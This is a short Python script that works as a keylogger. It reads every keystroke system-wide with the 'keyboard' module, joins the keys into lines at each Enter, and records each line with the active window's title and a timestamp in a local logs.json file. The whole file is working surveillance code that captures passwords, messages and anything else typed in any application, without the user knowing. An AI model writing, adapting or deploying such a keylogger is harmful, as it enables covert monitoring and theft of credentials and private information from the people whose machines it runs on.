

import os, pyautogui, keyboard, time, json
from datetime import datetime

current_dir = lambda : os.getcwd()
file_dir = f'{current_dir()}\\logs.json'

def get_window_title() -> list:
    try:
        return [True,pyautogui.getActiveWindowTitle()] # get the title of the mp4 file
    except Exception as _e:
    	return [False,'']
        #p(f'{standard_distance}[bright_red i b]{_e} occured')



def file_writer(string:str):
	def w_json(dict_ : dict, dir_ = file_dir) -> None:
		with open(dir_, 'w+') as file_:
			file_.write(json.dumps(dict_, indent=6))
	def r_json(dir_ = file_dir) -> dict:
		with open(dir_,'r+') as reader_:
			all_logs = json.load(reader_)
		return all_logs


	current_time = datetime.now()
	try:
		all_logs = r_json()
		all_logs[str(current_time)] = string
		w_json(all_logs)
	except Exception as ex_:
		w_json({})
		file_writer(string)

"""
Doesn't need to be perfect, just have to get the overall picture
"""
def word_fixer(word:list):
	hashset = {
		'space' : " ",
		'tab' : '    ',
		'backspace' : 'XXXbackspaceXXX',
		'ctrl' : '---ctrl---',
		'shift' : '---shift---',
		'caps lock' : '---caps lock---',
		'right' : '>>>right>>>',
		'alt' : '-_-alt-_-',
		'down' : '___down___',
		'up' : '^^^up^^^',
		'left' : '<<<left<<<'


	}
	def corrector(letter:str) -> str:
		try: return hashset[letter]
		except Exception as ex_: return letter

	final_out = []     
	i = 0
	length = len(word)
	while i < length:
		if i%2==0:
			final_out.append(corrector(word[i]))
		i+=1
	return final_out
"""

The keyboard module should be used because it reads the keys 
without being in the terminal

"""
import keyboard
# the latest module to wait for user input rather than get key
read_keyboard = lambda : keyboard.read_key()


_temp = []
_comp = []



while True:
	try:
		typed_ = read_keyboard()
		if typed_ != 'enter':
			_temp.append(typed_)		

		else:
			comp_word = "".join(word_fixer(_temp))
			_comp.append(comp_word)
			out_ = f"{get_window_title()}\n{comp_word}"
			file_writer(out_)
			_temp.clear()
			_comp.clear()
	except KeyboardInterrupt as e:
		break




  
  